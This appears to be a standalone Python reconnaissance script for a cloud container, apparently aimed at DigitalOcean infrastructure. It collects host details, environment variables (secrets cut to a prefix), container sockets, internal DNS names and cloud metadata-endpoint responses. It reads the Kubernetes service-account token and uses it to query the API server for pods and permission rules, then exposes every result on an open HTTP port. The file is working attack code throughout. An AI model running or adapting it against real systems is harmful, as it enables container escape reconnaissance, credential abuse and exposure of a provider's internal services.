import os,json,socket,ssl,urllib.request,subprocess,threading,base64
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
res={}
def add(k,v):
    try: res[k]=v
    except Exception: pass
def sh(c):
    try:
        p=subprocess.run(['sh','-c',c],capture_output=True,text=True,timeout=5)
        return (p.stdout+p.stderr)[:1200]
    except Exception as e: return 'ERR '+repr(e)[:100]
def get(u,hdr=None,t=4,limit=3000):
    try:
        req=urllib.request.Request(u,headers=hdr or {})
        r=urllib.request.urlopen(req,timeout=t,context=ssl._create_unverified_context())
        return r.status, r.read(limit)
    except Exception as e:
        return 'ERR', repr(e)[:200]
def probe():
    add('id',sh('id; uname -a'))
    add('cgroup',sh('cat /proc/1/cgroup'))
    add('caps',sh('grep -E "Cap(Eff|Prm|Bnd)" /proc/self/status'))
    env={}
    for k,v in sorted(os.environ.items()):
        if any(s in k.upper() for s in ('TOKEN','KEY','SECRET','PASS','AUTH','CRED')):
            env[k]=f'LEN={len(v)} PREFIX={v[:6]}'
        else:
            env[k]=v[:300]
    add('env',env)
    add('resolv',sh('cat /etc/resolv.conf; echo ---; cat /etc/hosts'))
    add('route',sh('cat /proc/net/route; echo ---; cat /proc/net/arp'))
    add('mounts',sh('grep -E "secret|kube|config|workspace|docker|tmp" /proc/mounts | head -30'))
    add('sockets',sh('ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /run/buildkit/buildkitd.sock 2>&1'))
    add('secrets_dir',sh('ls -la /var/run/secrets /run/secrets /var/run/secrets/kubernetes.io/serviceaccount 2>&1'))
    dns={}
    for h in ('kubernetes.default.svc','kubernetes.default','api.digitalocean.com','registry.digitalocean.com','ssrf-sheriff.internal.digitalocean.com','trusted-actions.vpc-endpoint.internal.digitalocean.com','agents-trusted.vpc-endpoint.internal.digitalocean.com','inference-trusted.vpc-endpoint.internal.digitalocean.com','metadata.google.internal','169.254.169.254'):
        try: dns[h]=sorted(set(x[4][0] for x in socket.getaddrinfo(h,None)))
        except Exception as e: dns[h]='ERR '+str(e)[:80]
    add('dns',dns)
    add('meta_json',get('http://169.254.169.254/metadata/v1.json',t=3))
    add('meta_id',get('http://169.254.169.254/metadata/v1/id',t=3))
    add('meta_aws',get('http://169.254.169.254/latest/meta-data/',t=3))
    add('meta_gcp',get('http://169.254.169.254/computeMetadata/v1/',{'Metadata-Flavor':'Google'},t=3))
    sa='/var/run/secrets/kubernetes.io/serviceaccount'
    add('sa_files',sh(f'ls -la {sa} 2>&1'))
    if os.path.exists(sa+'/token'):
        tok=open(sa+'/token').read()
        ns=open(sa+'/namespace').read().strip() if os.path.exists(sa+'/namespace') else ''
        add('sa_token_len',len(tok)); add('sa_ns',ns)
        try:
            p=tok.split('.')[1]; p+='='*(-len(p)%4); claims=json.loads(base64.urlsafe_b64decode(p))
            add('sa_claims',{k:claims.get(k) for k in ('iss','aud','sub','exp','iat')})
            add('sa_claims_all',list(claims.keys()))
        except Exception as e: add('sa_claims_err',repr(e)[:100])
        hdr={'Authorization':'Bearer '+tok}
        add('k8s_version',get('https://kubernetes.default.svc/version',hdr,t=4,limit=500))
        add('k8s_pods',get(f'https://kubernetes.default.svc/api/v1/namespaces/{ns}/pods?limit=1',hdr,t=4,limit=800))
        add('k8s_rules',get('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',dict(hdr,**{'Content-Type':'application/json'}),t=4,limit=4000))
    add('done',True)
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        try: data=open('/tmp/out.json','rb').read()
        except Exception: data=b'{"status":"probing"}'
        self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Length',str(len(data))); self.end_headers(); self.wfile.write(data)
    def log_message(self,*a): pass
srv=ThreadingHTTPServer(('0.0.0.0',8080),H)
threading.Thread(target=srv.serve_forever,daemon=True).start()
try: probe()
except Exception as e: res['probe_error']=repr(e)[:300]
open('/tmp/out.json','w').write(json.dumps(res,default=str))
while True: threading.Event().wait(3600)
